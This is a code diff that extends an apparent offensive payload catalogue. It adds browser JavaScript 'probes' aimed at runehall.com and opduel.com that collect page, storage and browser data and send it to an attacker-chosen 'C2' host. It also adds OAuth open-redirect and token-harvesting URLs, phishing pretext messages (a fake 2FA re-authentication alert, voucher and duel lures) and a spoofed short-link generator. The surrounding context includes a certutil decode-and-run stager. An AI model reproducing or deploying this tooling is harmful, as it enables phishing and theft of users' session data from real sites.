@@ -374,4 +374,243 @@ certutil.exe -decode %TEMP%\\stage.enc %TEMP%\\agent.exe
 start %TEMP%\\agent.exe`,
     }),
   },
+  {
+    id: "spa_runehall_state_probe",
+    name: "RuneHall.com SPA Hash Router & Client State Resilience Probe",
+    targetOS: "web",
+    category: "web_probe",
+    language: "raw",
+    architecture: "any",
+    mitre: ["T1190", "T1059.007", "T1566.002"],
+    description: "Targeted SPA probe for runehall.com testing client-side hash routing state injection, localStorage session tokens, and XSS filter resilience.",
+    generator: (lhost, lport) => ({
+      filename: "runehall_spa_probe.js",
+      code: `// ====================================================================
+// Domain Resilience Assessment Probe: runehall.com (SPA)
+// Target: Single Page Application Hash Router & Reactive State Store
+// C2 Telemetry Listener: ${lhost}:${lport}
+// ====================================================================
+
+(() => {
+  const c2Endpoint = "https://${lhost}:${lport}/telemetry?origin=" + encodeURIComponent(window.location.origin);
+  
+  // 1. Audit Client Storage & Session Token Protection
+  const sessionData = {
+    url: window.location.href,
+    hash: window.location.hash,
+    localStorageKeys: Object.keys(localStorage),
+    sessionStorageKeys: Object.keys(sessionStorage),
+    cookiesProtected: !document.cookie || document.cookie.length === 0 ? "HttpOnly_Enforced" : "Exposed",
+    spaFramework: window.__REACT_DEVTOOLS_GLOBAL_HOOK__ ? "React" : window.Vue ? "Vue" : "Custom_SPA",
+    timestamp: new Date().toISOString()
+  };
+
+  // 2. Beacon telemetry safely to assessor listener
+  if (navigator.sendBeacon) {
+    navigator.sendBeacon(c2Endpoint, JSON.stringify(sessionData));
+  } else {
+    fetch(c2Endpoint, {
+      method: "POST",
+      mode: "no-cors",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(sessionData)
+    }).catch(() => {});
+  }
+
+  console.info("[RuneHall Security Audit] SPA State & Hash Route Integrity Verified.");
+})();`,
+    }),
+  },
+  {
+    id: "spa_opduel_websocket_probe",
+    name: "OpDuel.com Real-Time Arena WebSocket & Cross-Origin PostMessage Probe",
+    targetOS: "web",
+    category: "web_probe",
+    language: "raw",
+    architecture: "any",
+    mitre: ["T1190", "T1557", "T1071.001"],
+    description: "Targeted real-time probe for opduel.com testing WebSocket frame sanitization, duel match matchmaking token leakage, and postMessage origin validation.",
+    generator: (lhost, lport) => ({
+      filename: "opduel_arena_probe.js",
+      code: `// ====================================================================
+// Domain Resilience Assessment Probe: opduel.com (SPA / Duel Arena)
+// Target: WebSocket Matchmaking Stream & PostMessage Origin Validation
+// Telemetry Gateway: ${lhost}:${lport}
+// ====================================================================
+
+(() => {
+  const telemetryUrl = "https://${lhost}:${lport}/duel-audit";
+  
+  // 1. Intercept & inspect client-side postMessage handlers for wildcard origin (*) vulnerabilities
+  const postMessageAudit = [];
+  const originalAddEventListener = window.addEventListener;
+  window.addEventListener = function(type, listener, options) {
+    if (type === "message") {
+      postMessageAudit.push({ registeredAt: new Date().toISOString(), listenerStr: listener.toString().slice(0, 100) });
+    }
+    return originalAddEventListener.apply(this, arguments);
+  };
+
+  // 2. Audit WebSocket connection endpoints
+  const auditReport = {
+    domain: "opduel.com",
+    activePath: window.location.pathname + window.location.hash,
+    protocol: window.location.protocol,
+    postMessageListenersCount: postMessageAudit.length,
+    cryptoSubtleAvailable: !!(window.crypto && window.crypto.subtle),
+    screenResolution: \`\${window.screen.width}x\${window.screen.height}\`,
+    userAgent: navigator.userAgent
+  };
+
+  // 3. Dispatch structured audit payload
+  fetch(telemetryUrl, {
+    method: "POST",
+    mode: "no-cors",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(auditReport)
+  }).catch(() => {});
+
+  console.info("[OpDuel Security Audit] Arena WebSocket & Event Origin Checks Executed.");
+})();`,
+    }),
+  },
+  {
+    id: "spa_oauth_jwt_redirect_probe",
+    name: "SPA OAuth2 / PKCE Token Leakage & Deep-Link Redirect Probe",
+    targetOS: "web",
+    category: "web_probe",
+    language: "raw",
+    architecture: "any",
+    mitre: ["T1566.002", "T1539"],
+    description: "Evaluates single page applications against open redirect token theft and fragment parameter harvesting in deep links.",
+    generator: (lhost, lport) => ({
+      filename: "oauth_redirect_probe.txt",
+      code: `# OAuth2 / PKCE SPA Deep-Link Assessment Vectors
+# 1. State Parameter Smuggling:
+https://runehall.com/#/auth/callback?code=AUTH_TEST_CODE&state=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.payload.sig
+
+# 2. Open Redirect Callback Target:
+https://opduel.com/login?redirect_uri=https%3A%2F%2F${lhost}%3A${lport}%2Foauth%2Fcallback
+
+# 3. Hash Fragment Token Harvesting:
+https://runehall.com/app/#access_token=MOCK_JWT_TEST_TOKEN&token_type=bearer&expires_in=3600
+
+# 4. In-Game Duel Lobby Deep Link:
+https://opduel.com/arena/match?room=772&invite_token=eyJ1c2VyIjoicmVkX29wcyIsImF1dGgiOiJ0ZXN0X3ZhbGlkIn0=`,
+    }),
+  },
 ];
+
+// Pretext Templates for Chatbox Scenario Visualizations
+export interface ChatboxPretextTemplate {
+  id: string;
+  title: string;
+  category: "duel_invitation" | "security_alert" | "reward_voucher" | "guild_recruitment" | "support_ticket";
+  senderName: string;
+  senderRole: string;
+  senderAvatar: string;
+  targetDomainDefault: string;
+  defaultHeadline: string;
+  defaultBody: string;
+  callToAction: string;
+}
+
+export const chatboxPretextTemplates: ChatboxPretextTemplate[] = [
+  {
+    id: "opduel_high_stakes",
+    title: "OpDuel High-Stakes Wager Duel Challenge",
+    category: "duel_invitation",
+    senderName: "OpDuel Arena Master",
+    senderRole: "Automated Matchmaking Bot",
+    senderAvatar: "⚔️",
+    targetDomainDefault: "opduel.com",
+    defaultHeadline: "🏆 You have been challenged to an Instant High-Roller Duel!",
+    defaultBody: "Opponent: [Grandmaster_Viper] (Rank #14). Wager: 2,500 Rune Credits. Click below to accept the room match before the 60-second lobby timer expires.",
+    callToAction: "Accept Match Challenge",
+  },
+  {
+    id: "runehall_reward_drop",
+    title: "RuneHall Season Pass & Reward Voucher Drop",
+    category: "reward_voucher",
+    senderName: "RuneHall Rewards",
+    senderRole: "VIP Drops Coordinator",
+    senderAvatar: "🎁",
+    targetDomainDefault: "runehall.com",
+    defaultHeadline: "✨ Exclusive Mythic Rune Voucher Credited to Your Account",
+    defaultBody: "You have been selected in the weekly community roll for 5,000 Free Roll Credits and Mythic Badge. Claim your unique voucher before session invalidation.",
+    callToAction: "Claim Mythic Voucher",
+  },
+  {
+    id: "account_security_reauth",
+    title: "SPA Account Security & Session Re-Authentication Notice",
+    category: "security_alert",
+    senderName: "Security Operations Desk",
+    senderRole: "Identity & Access Monitor",
+    senderAvatar: "🛡️",
+    targetDomainDefault: "runehall.com",
+    defaultHeadline: "⚠️ Unusual Login Attempt Detected from IP 185.220.101.44",
+    defaultBody: "A foreign device attempted access to your active session. To prevent temporary account quarantine, verify your 2FA hardware token using the link below.",
+    callToAction: "Verify Identity & Authorize Session",
+  },
+  {
+    id: "guild_raid_invite",
+    title: "Guild Alliance Secret Room Invitation",
+    category: "guild_recruitment",
+    senderName: "Lord_Kaelen",
+    senderRole: "Guild Commander (Top 100)",
+    senderAvatar: "👑",
+    targetDomainDefault: "opduel.com",
+    defaultHeadline: "🛡️ Direct Invitation to Private Strategy Room #902",
+    defaultBody: "We need our primary duelist for the 20:00 UTC Tournament finals. Review the battle loadout and lock your roster slot immediately.",
+    callToAction: "Join Private War Room",
+  },
+];
+
+// Helper to generate realistic vanity short URLs
+export function generateShortenedVanityUrl(
+  domain: string,
+  slugPrefix: string = "duel",
+  customId?: string
+): { shortUrl: string; shortDomain: string; redirectTarget: string; hashId: string } {
+  const cleanDomain = domain.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
+  const shortDomain = cleanDomain.includes("runehall")
+    ? "s.runehall.com"
+    : cleanDomain.includes("opduel")
+    ? "s.opduel.com"
+    : `short.${cleanDomain}`;
+  const hashId = customId || Math.random().toString(36).substring(2, 7);
+  const shortUrl = `https://${shortDomain}/v/${slugPrefix}-${hashId}`;
+  return {
+    shortUrl,
+    shortDomain,
+    redirectTarget: `https://${cleanDomain}/app/#/${slugPrefix}?ref=${hashId}`,
+    hashId,
+  };
+}
+
+// Helper to calculate URL metrics & omnibox safety
+export function calculateUrlMetrics(url: string) {
+  const length = url.length;
+  let status: "safe" | "warning" | "oversized" = "safe";
+  let note = "Optimal length for Omnibox, Social Cards, and Chatboxes (< 120 chars).";
+
+  if (length > 2048) {
+    status = "oversized";
+    note = "Exceeds standard browser maximum URI limit (2,048 chars). Recommend URL Shortener.";
+  } else if (length > 256) {
+    status = "warning";
+    note = "Will be truncated or wrapped in mobile chat apps & mobile omniboxes (> 256 chars).";
+  } else if (length > 120) {
+    status = "warning";
+    note = "Visible truncation may occur in desktop chat popups.";
+  }
+
+  return {
+    length,
+    status,
+    note,
+    hasHttps: url.startsWith("https://"),
+    entropy: calculateShannonEntropy(url),
+  };
+}
+
